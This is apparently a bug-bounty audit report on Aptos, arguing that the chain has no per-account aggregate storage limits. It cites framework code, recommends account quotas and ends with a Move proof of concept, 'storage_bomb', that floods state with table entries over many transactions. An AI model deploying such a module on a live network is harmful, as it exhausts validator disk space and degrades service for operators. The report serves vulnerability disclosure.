# Audit Report

## Title
Storage Quota Evasion via Absence of Per-Account Aggregate Limits

## Summary
Aptos blockchain lacks per-account aggregate storage limits, allowing attackers to create unlimited small items across multiple transactions that individually comply with per-transaction limits but collectively exhaust validator storage. Only global storage tracking and economic constraints exist, with no technical enforcement preventing disproportionate storage consumption by a single account.

## Finding Description

The `StateStorageUsage` struct tracks storage usage exclusively at the **global level**, not per-account: [1](#0-0) [2](#0-1) 

The system enforces only **per-transaction** limits, not aggregate per-account limits: [3](#0-2) [4](#0-3) [5](#0-4) 

Storage fee enforcement occurs only at transaction execution time, checking against per-transaction maximum: [6](#0-5) 

**Attack Vector:**

An attacker can exploit this by:

1. Creating a Move module with a `Table<u64, u8>` resource
2. Sending repeated transactions, each adding ~5,000 small entries (staying under 2 APT storage fee limit)
3. Each transaction passes all per-transaction checks
4. Over thousands of transactions, accumulates millions/billions of small state items
5. No code path enforces aggregate limits per account

The `Table` implementation has no size restrictions on total entries: [7](#0-6) [8](#0-7) 

**Validator Impact:**

Validator operational alerts explicitly acknowledge this risk: [9](#0-8) 

When validators approach disk capacity limits, critical alerts trigger: [10](#0-9) 

## Impact Explanation

This vulnerability meets **Medium Severity** criteria per Aptos bug bounty program: "State inconsistencies requiring intervention."

**Specific Impacts:**

1. **Validator Operational Degradation**: Attackers can force validators to exhaustion thresholds (<200GB warning, <50GB critical), requiring manual intervention (disk expansion, pruning configuration changes)

2. **Disproportionate Resource Consumption**: Single account can consume storage far exceeding fair-share allocation, affecting network health

3. **Breaks Resource Limits Invariant**: Critical invariant #9 states "All operations must respect gas, storage, and computational limits" - but no aggregate storage limits exist per account

4. **Economic Defense Insufficient**: While dynamic gas pricing increases costs with utilization, a well-funded attacker can still exhaust storage since costs remain finite

The impact does not reach High/Critical severity because:
- No consensus violation occurs
- No fund loss/theft
- Validators can eventually recover by expanding disk
- Attack requires significant economic investment

## Likelihood Explanation

**Likelihood: Medium**

**Attacker Requirements:**
- Sufficient funds (tens of thousands of APT depending on target storage exhaustion)
- Basic Move programming knowledge to create table-based storage module
- Ability to send repeated transactions

**Feasibility:**
- Attack is straightforward - no complex exploit logic needed
- Per-transaction limits are publicly documented
- Tables are standard data structures in Move
- No detection/prevention mechanisms exist in code

**Constraints:**
- Economic cost increases exponentially with global storage utilization per dynamic gas pricing: [11](#0-10) 

- Storage fees calculated per item and per byte: [12](#0-11) 

However, costs remain deterministic and finite - not a true prevention mechanism.

## Recommendation

Implement **per-account aggregate storage limits** to prevent disproportionate consumption:

**Option 1: Account-Level Storage Quota (Recommended)**

Add per-account storage tracking to `AccountResource` with configurable limits:

```move
// In aptos-move/framework/aptos-framework/sources/account.move
struct Account has key {
    // ... existing fields ...
    storage_usage: StorageUsage,
}

struct StorageUsage has store {
    items_created: u64,
    bytes_allocated: u64,
    max_items: u64,       // e.g., 100,000 items per account
    max_bytes: u64,       // e.g., 100 MB per account
}
```

Enforce limits during transaction execution in change set validation:

```rust
// In aptos-move/aptos-vm-types/src/storage/change_set_configs.rs
pub struct ChangeSetConfigs {
    // ... existing fields ...
    max_items_per_account: u64,
    max_bytes_per_account: u64,
}
```

**Option 2: Rate Limiting**

Implement per-account rate limits on new state item creation per epoch.

**Option 3: Progressive Pricing**

Charge exponentially increasing fees based on per-account storage usage, not just global usage.

## Proof of Concept

```move
// File: storage_exhaustion_attack.move
module attacker::storage_bomb {
    use std::signer;
    use aptos_std::table::{Self, Table};
    
    struct StorageBomb has key {
        data: Table<u64, u8>,
        next_key: u64,
    }
    
    // Initialize the storage bomb
    public entry fun initialize(account: &signer) {
        move_to(account, StorageBomb {
            data: table::new(),
            next_key: 0,
        });
    }
    
    // Add many small entries (each transaction creates ~5000 entries)
    // Stays under per-transaction limits but accumulates over time
    public entry fun add_entries(account: &signer, count: u64) acquires StorageBomb {
        let addr = signer::address_of(account);
        let bomb = borrow_global_mut<StorageBomb>(addr);
        
        let i = 0;
        while (i < count) {
            table::add(&mut bomb.data, bomb.next_key, 1u8); // 1 byte value
            bomb.next_key = bomb.next_key + 1;
            i = i + 1;
        };
    }
    
    // Attacker can call add_entries(5000) repeatedly across many transactions
    // Each transaction costs ~2 APT in storage fees
    // No aggregate limit prevents accumulating millions of entries
    // After 20,000 transactions: 100 million items created
    // Validator storage impact: significant disk consumption
}

#[test_only]
module attacker::storage_bomb_test {
    use attacker::storage_bomb;
    use std::signer;
    
    #[test(attacker = @0x123)]
    public fun test_storage_exhaustion(attacker: &signer) {
        // Initialize bomb
        storage_bomb::initialize(attacker);
        
        // Simulate multiple transactions creating small items
        // Each call represents one transaction
        let i = 0;
        while (i < 100) { // Simulate 100 transactions
            storage_bomb::add_entries(attacker, 5000);
            i = i + 1;
        };
        // Total: 500,000 items created across 100 transactions
        // In production, attacker could continue indefinitely
        // No per-account aggregate limit prevents this
    }
}
```

**Execution Impact:**
- Each transaction creates 5,000 state items (staying under 8,192 limit)
- Storage fee per transaction: ~2 APT (under max_storage_fee)
- 100 transactions: 500,000 items, ~200 APT cost
- 20,000 transactions: 100 million items, ~40,000 APT base cost
- No code path enforces aggregate limits on total items per account
- Validators must store all items, causing disk exhaustion risk

## Notes

The vulnerability stems from architectural design relying solely on economic constraints without technical aggregate limits. The dynamic gas pricing in `storage_gas.move` increases costs with global utilization but doesn't prevent individual accounts from consuming disproportionate storage. The validator alert documentation acknowledges this risk by mentioning "state explosion" concerns. While the economic cost is significant, it remains finite and deterministic, allowing well-funded attackers to execute the attack. Per-account aggregate limits would provide defense-in-depth beyond economic deterrence alone.

### Citations

**File:** aptos-move/framework/aptos-framework/sources/state_storage.move (L19-22)
```text
    struct StateStorageUsage has key, store {
        epoch: u64,
        usage: Usage,
    }
```

**File:** types/src/state_store/state_storage_usage.rs (L8-11)
```rust
pub enum StateStorageUsage {
    Tracked { items: usize, bytes: usize },
    Untracked,
}
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/transaction.rs (L159-161)
```rust
            max_bytes_all_write_ops_per_transaction: NumBytes,
            { 5.. => "max_bytes_all_write_ops_per_transaction" },
            10 << 20, // all write ops from a single transaction are 10MB max
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/transaction.rs (L174-176)
```rust
            max_write_ops_per_transaction: NumSlots,
            { 11.. => "max_write_ops_per_transaction" },
            8192,
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/transaction.rs (L231-233)
```rust
            max_storage_fee: Fee,
            { 7.. => "max_storage_fee" },
            2_0000_0000, // 2 APT
```

**File:** aptos-move/aptos-gas-meter/src/algebra.rs (L293-295)
```rust
        if self.feature_version >= 7 && self.storage_fee_used > self.max_storage_fee {
            return Err(PartialVMError::new(StatusCode::STORAGE_LIMIT_REACHED));
        }
```

**File:** aptos-move/framework/aptos-stdlib/sources/table.move (L1-6)
```text
/// Type of large-scale storage tables.
/// source: https://github.com/move-language/move/blob/1b6b7513dcc1a5c866f178ca5c1e74beb2ce181e/language/extensions/move-table-extension/sources/Table.move#L1
///
/// It implements the Table type which supports individual table items to be represented by
/// separate global state items. The number of items and a unique handle are tracked on the table
/// struct itself, while the operations are implemented as native functions. No traversal is provided.
```

**File:** aptos-move/framework/aptos-stdlib/sources/table.move (L27-29)
```text
    public fun add<K: copy + drop, V>(self: &mut Table<K, V>, key: K, val: V) {
        add_box<K, V, Box<V>>(self, key, Box { val })
    }
```

**File:** terraform/helm/monitoring/files/rules/alerts.yml (L107-109)
```yaml
        4 If everything made sense, it's a bigger issue, somehow our gas schedule didn't stop state explosion before an alert is triggered. Our recommended disk \
          spec and/or default pruning configuration, as well as storage gas schedule need updates. Discuss with the ecosystem team and send out a PR on the docs site, \
          form a plan to inform the node operator community and prepare for a on-chain proposal to update the gas schedule."
```

**File:** terraform/helm/monitoring/files/rules/alerts.yml (L110-115)
```yaml
  - alert: Validator Very Low Disk Space (critical)
    expr: (kubelet_volume_stats_capacity_bytes{persistentvolumeclaim=~".*(validator|fullnode)-e.*"} - kubelet_volume_stats_used_bytes) / 1024 / 1024 / 1024 < 50
    for: 5m
    labels:
      severity: critical
      summary: "Less than 50 GB of free space on Aptos Node."
```

**File:** aptos-move/framework/aptos-framework/sources/storage_gas.move (L399-410)
```text
        let item_config = UsageGasConfig {
            target_usage: 2 * k * m, // 2 billion
            read_curve: base_8192_exponential_curve(300 * k, 300 * k * 100),
            create_curve: base_8192_exponential_curve(300 * k, 300 * k * 100),
            write_curve: base_8192_exponential_curve(300 * k, 300 * k * 100),
        };
        let byte_config = UsageGasConfig {
            target_usage: 1 * m * m, // 1TB
            read_curve: base_8192_exponential_curve(300, 300 * 100),
            create_curve: base_8192_exponential_curve(5 * k,  5 * k * 100),
            write_curve: base_8192_exponential_curve(5 * k,  5 * k * 100),
        };
```

**File:** aptos-move/aptos-vm-types/src/storage/space_pricing.rs (L173-186)
```rust
        match op.op_size {
            Creation { .. } => {
                // permanent storage fee
                let slot_deposit = u64::from(params.storage_fee_per_state_slot);

                op.metadata_mut.maybe_upgrade();
                op.metadata_mut.set_slot_deposit(slot_deposit);
                op.metadata_mut.set_bytes_deposit(target_bytes_deposit);

                ChargeAndRefund {
                    charge: (slot_deposit + target_bytes_deposit).into(),
                    refund: 0.into(),
                }
            },
```
